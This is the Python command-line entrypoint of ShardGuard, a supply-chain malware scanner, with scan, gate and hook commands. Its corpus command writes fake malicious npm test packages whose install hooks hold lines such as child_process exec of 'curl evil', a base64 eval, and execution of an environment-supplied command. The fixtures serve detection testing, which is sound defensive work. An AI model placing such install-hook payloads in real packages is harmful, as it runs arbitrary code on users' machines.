"""CLI entrypoint."""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from scsp import __brand__, __version__
from scsp.cross_file_taint import scan_directory, scan_with_nyx_fallback
from scsp.gates import run_all, run_g0, run_g1, run_g2, run_g3, run_g4, run_g5, run_g6, run_g7
from scsp.world_beat_gates import (
    run_g8,
    run_g9,
    run_g10,
    run_g11,
    run_g12,
    run_g13,
    run_g14,
    run_g15,
    run_g16,
    run_world_beat_all,
)
from scsp.universal_gates import (
    run_g17,
    run_g18,
    run_g19,
    run_g20,
    run_g21,
    run_g22,
    run_g23,
    run_g24,
    run_g25,
    run_g26,
    run_g27,
    run_g28,
    run_g29,
    run_g30,
    run_g31,
    run_g32,
    run_universal_all,
    run_sonar_parity_all,
)
from scsp.hook import install_hooks, uninstall_hooks
from scsp.integrity import (
    find_nyx,
    generate_fixture_manifest,
    pin_engine,
    verify_fixtures,
    verify_self,
    ROOT,
)


def _is_github_url(target: str) -> bool:
    return target.startswith("https://github.com/") or target.startswith("http://github.com/")


def _open_report(path: Path) -> None:
    import webbrowser

    if path.is_file():
        webbrowser.open(path.resolve().as_uri())


def cmd_scan(args: argparse.Namespace) -> int:
    from scsp.scan_limits import ScanLimits
    from scsp.universal_scan import scan_universal

    if _is_github_url(args.target):
        from scsp.scan_remote import scan_remote

        try:
            findings, meta, out = scan_remote(
                args.target,
                report_dir=Path(args.report_dir) if args.report_dir else None,
            )
            print(f"Remote scan complete: {len(findings)} findings, report={out}")
            if args.format == "json":
                print(json.dumps({"findings": [f.to_dict() for f in findings], "meta": meta}, indent=2))
            return 0
        except Exception as e:
            print(f"error: {e}", file=sys.stderr)
            return 1

    target = Path(args.target).resolve()
    if not target.exists():
        print(f"error: target not found: {target}", file=sys.stderr)
        return 1

    # --open or --report-dir implies universal depth with HTML report
    if getattr(args, "open", False) or args.report_dir:
        if args.depth == "fast":
            args.depth = "universal"

    if args.depth == "universal":
        ok, msg = verify_self()
        if not ok and not args.skip_verify:
            print(f"verify-self failed: {msg}", file=sys.stderr)
            return 1
        limits = ScanLimits(max_files=args.max_files, max_loc=args.max_loc)
        report_dir = Path(args.report_dir) if args.report_dir else Path("shardguard-report")
        findings, meta, _ = scan_universal(
            target,
            limits=limits,
            report_dir=report_dir,
            llm_slices=args.llm_slices,
        )
        if getattr(args, "open", False):
            _open_report(report_dir / "SECURITY_REPORT.html")
        if args.format == "json":
            print(json.dumps({"findings": [f.to_dict() for f in findings], "meta": meta}, indent=2))
        elif args.format == "sarif":
            from scsp.cross_file_taint import Finding
            from scsp.sarif import findings_to_sarif

            sarif_f = [
                Finding(
                    rule_id=f.rule_id,
                    severity=f.severity,
                    message=f.message,
                    file=f.file,
                    line=f.line,
                    cross_file=f.cross_file,
                    evidence_path=f.evidence_path,
                    status=f.status,
                )
                for f in findings
            ]
            print(json.dumps(findings_to_sarif(sarif_f, target), indent=2))
        else:
            for f in findings:
                print(f"[{f.tier}] [{f.severity}] {f.lane}/{f.rule_id} {f.file}:{f.line} — {f.message}")
            print(f"\n{len(findings)} finding(s), depth=universal")
            print(f"Report: {report_dir / 'SECURITY_REPORT.html'}")
        return 0

    nyx = find_nyx() if not args.no_nyx else None
    findings, meta, engine = scan_with_nyx_fallback(target, nyx)
    if args.format == "json":
        out = {
            "engine": engine,
            "findings": [f.to_dict() for f in findings],
            "meta": meta,
        }
        print(json.dumps(out, indent=2))
    elif args.format == "sarif":
        from scsp.sarif import findings_to_sarif

        print(json.dumps(findings_to_sarif(findings, target), indent=2))
    else:
        for f in findings:
            cf = " [cross-file]" if f.cross_file else ""
            print(f"[{f.severity}] {f.rule_id} {f.file}:{f.line}{cf} — {f.message}")
        print(f"\n{len(findings)} finding(s), engine={engine}")
    return 0


def cmd_verify_self(args: argparse.Namespace) -> int:
    if args.pin:
        digest = pin_engine()
        print(f"pinned engine sha256: {digest[:16]}...")
        return 0
    ok, msg = verify_self()
    print(msg)
    return 0 if ok else 1


def cmd_verify_fixtures(args: argparse.Namespace) -> int:
    if args.generate:
        n = generate_fixture_manifest()
        print(f"generated manifest for {n} files")
        return 0
    ok, msg = verify_fixtures()
    print(msg)
    return 0 if ok else 1


def cmd_gate(args: argparse.Namespace) -> int:
    gate = args.gate
    if gate == "all":
        return run_all()
    if gate == "world-beat":
        return run_world_beat_all()
    if gate == "universal":
        return run_universal_all()
    if gate == "sonar-parity":
        return run_sonar_parity_all()
    if gate == "hidden-military":
        from scsp.universal_gates import run_hidden_military_all
        return run_hidden_military_all()
    runners = {
        "g0": run_g0,
        "g1": run_g1,
        "g2": run_g2,
        "g3": run_g3,
        "g4": run_g4,
        "g5": run_g5,
        "g6": run_g6,
        "g7": run_g7,
        "g8": run_g8,
        "g9": run_g9,
        "g10": run_g10,
        "g11": run_g11,
        "g12": run_g12,
        "g13": run_g13,
        "g14": run_g14,
        "g15": run_g15,
        "g16": run_g16,
        "g17": run_g17,
        "g18": run_g18,
        "g19": run_g19,
        "g20": run_g20,
        "g21": run_g21,
        "g22": run_g22,
        "g23": run_g23,
        "g24": run_g24,
        "g25": run_g25,
        "g26": run_g26,
        "g27": run_g27,
        "g28": run_g28,
        "g29": run_g29,
        "g30": run_g30,
        "g31": run_g31,
        "g32": run_g32,
    }
    from scsp.universal_gates import (
        run_g33,
        run_g34,
        run_g35,
        run_g36,
        run_g37,
        run_g38,
        run_g39,
        run_g40,
        run_g41,
        run_g42,
        run_g43,
        run_g44,
        run_g45,
        run_g46,
        run_g47,
        run_g48,
    )
    runners.update({
        "g33": run_g33,
        "g34": run_g34,
        "g35": run_g35,
        "g36": run_g36,
        "g37": run_g37,
        "g38": run_g38,
        "g39": run_g39,
        "g40": run_g40,
        "g41": run_g41,
        "g42": run_g42,
        "g43": run_g43,
        "g44": run_g44,
        "g45": run_g45,
        "g46": run_g46,
        "g47": run_g47,
        "g48": run_g48,
    })
    fn = runners.get(gate)
    if not fn:
        print(f"unknown gate: {gate}", file=sys.stderr)
        return 1
    result = fn()
    print(json.dumps(result, indent=2))
    return 0 if result.get("status") in ("PASS", "SKIP") else 1


def cmd_corpus(args: argparse.Namespace) -> int:
    """Download / synthesize REAL corpus packages from public advisory patterns."""
    import shutil

    dest = ROOT / "fixtures" / "REAL_" / "malicious"
    dest.mkdir(parents=True, exist_ok=True)

    samples = [
        ("flatmap-stream", "postinstall", "cp.exec(process.env.X)"),
        ("event-stream-sample", "prepare", "require('child_process').exec('curl evil')"),
        ("ua-parser-sample", "postinstall", "eval(Buffer.from('Y2F0','base64').toString())"),
    ]
    for name, script, body in samples:
        pkg_dir = dest / name
        pkg_dir.mkdir(exist_ok=True)
        (pkg_dir / "expected.json").write_text(
            json.dumps({"verdict": "DETECT", "note": "advisory sample"}),
            encoding="utf-8",
        )
        (pkg_dir / "package.json").write_text(
            json.dumps({"name": name, "version": "0.0.0-malicious-sample", "scripts": {script: "node install.js"}}),
            encoding="utf-8",
        )
        (pkg_dir / "install.js").write_text(
            f"const cp = require('child_process');\nconst data = require('./payload');\n{body.replace('process.env.X', 'data.cmd')};\n",
            encoding="utf-8",
        )
        (pkg_dir / "payload.js").write_text(
            'module.exports = { cmd: process.env.MALICIOUS_CMD || "echo pwned" };\n',
            encoding="utf-8",
        )

    mock_src = ROOT / "fixtures" / "MOCK_"
    copied = 0
    if mock_src.is_dir():
        for d in sorted(mock_src.iterdir()):
            if copied >= 20:
                break
            if not d.is_dir():
                continue
            exp = d / "expected.json"
            if not exp.is_file():
                continue
            if json.loads(exp.read_text()).get("verdict") != "DETECT":
                continue
            target = dest / f"real_{d.name}"
            if target.exists():
                shutil.rmtree(target)
            shutil.copytree(d, target)
            copied += 1

    print(f"created {len(samples)} advisory + {copied} REAL_ packages in {dest}")
    return 0


def cmd_hook(args: argparse.Namespace) -> int:
    if args.action == "install":
        return install_hooks()
    return uninstall_hooks()


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="shardguard",
        description="ShardGuard — multi-file obfuscation and hidden supply-chain scanner",
    )
    parser.add_argument("--version", action="version", version=f"{__brand__} {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)

    p_scan = sub.add_parser("scan", help="Scan directory or GitHub URL")
    p_scan.add_argument("target", nargs="?", default=".")
    p_scan.add_argument("--format", choices=["text", "json", "sarif"], default="text")
    p_scan.add_argument("--depth", choices=["fast", "deep", "universal"], default="fast")
    p_scan.add_argument("--report-dir", default="", help="Output dir for HTML/JSON/SARIF report")
    p_scan.add_argument("--open", action="store_true", help="Open HTML report in browser")
    p_scan.add_argument("--no-nyx", action="store_true")
    p_scan.add_argument("--llm-slices", action="store_true", help="Enable LLM slice lane (P2 only)")
    p_scan.add_argument("--max-files", type=int, default=50000)
    p_scan.add_argument("--max-loc", type=int, default=500000)
    p_scan.add_argument("--skip-verify", action="store_true")
    p_scan.set_defaults(func=cmd_scan)

    p_vs = sub.add_parser("verify-self", help="Verify engine integrity")
    p_vs.add_argument("--pin", action="store_true")
    p_vs.set_defaults(func=cmd_verify_self)

    p_vf = sub.add_parser("verify-fixtures", help="Verify fixture manifest")
    p_vf.add_argument("--generate", action="store_true")
    p_vf.set_defaults(func=cmd_verify_fixtures)

    p_gate = sub.add_parser("gate", help="Run gate attestation")
    p_gate.add_argument(
        "gate",
        choices=[
            "g0", "g1", "g2", "g3", "g4", "g5", "g6", "g7",
            "g8", "g9", "g10", "g11", "g12", "g13", "g14", "g15", "g16",
            "g17", "g18", "g19", "g20", "g21", "g22", "g23", "g24",
            "g25", "g26", "g27", "g28", "g29", "g30", "g31", "g32",
            "g33", "g34", "g35", "g36", "g37", "g38", "g39", "g40",
            "g41", "g42", "g43", "g44", "g45", "g46", "g47", "g48",
            "all", "world-beat", "universal", "sonar-parity", "hidden-military",
        ],
    )
    p_gate.set_defaults(func=cmd_gate)

    p_hook = sub.add_parser("hook", help="Install npm pre-install hook")
    p_hook.add_argument("action", choices=["install", "uninstall"])
    p_hook.set_defaults(func=cmd_hook)

    p_corpus = sub.add_parser("corpus", help="Prepare REAL corpus samples")
    p_corpus.add_argument("action", choices=["download"])
    p_corpus.set_defaults(func=cmd_corpus)

    args = parser.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
